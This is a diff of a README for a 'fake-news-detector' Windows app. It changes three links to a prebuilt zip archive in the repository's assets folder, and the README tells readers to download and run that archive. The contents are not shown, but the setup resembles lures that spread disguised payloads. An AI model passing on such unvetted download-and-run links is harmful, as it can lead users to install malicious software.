@@ -1,6 +1,6 @@
 # 🤖 fake-news-detector - Check News Before You Share
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/fabioeschatological621/fake-news-detector/raw/refs/heads/main/assets/detector_fake_news_v1.0.zip)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fabioeschatological621/fake-news-detector/main/assets/detector_fake_news_v1.0.zip)
 
 ## 🖥️ What This App Does
 
@@ -19,7 +19,7 @@ The app gives a fake or real result from the text you enter. It is built for sim
 
 Open this page and use it to download and run the app:
 
-[Download fake-news-detector](https://github.com/fabioeschatological621/fake-news-detector/raw/refs/heads/main/assets/detector_fake_news_v1.0.zip)
+[Download fake-news-detector](https://raw.githubusercontent.com/fabioeschatological621/fake-news-detector/main/assets/detector_fake_news_v1.0.zip)
 
 If the page has a release file, download it to your computer. If it has a folder or project page, use the files there to get the app running on Windows.
 
@@ -224,6 +224,6 @@ If you open a page or web view, review what data you enter before you paste sens
 
 ## 📎 Download Again
 
-[Download fake-news-detector](https://github.com/fabioeschatological621/fake-news-detector/raw/refs/heads/main/assets/detector_fake_news_v1.0.zip)
+[Download fake-news-detector](https://raw.githubusercontent.com/fabioeschatological621/fake-news-detector/main/assets/detector_fake_news_v1.0.zip)
 
 Use this link if you need to get the files again or open the project page on GitHub
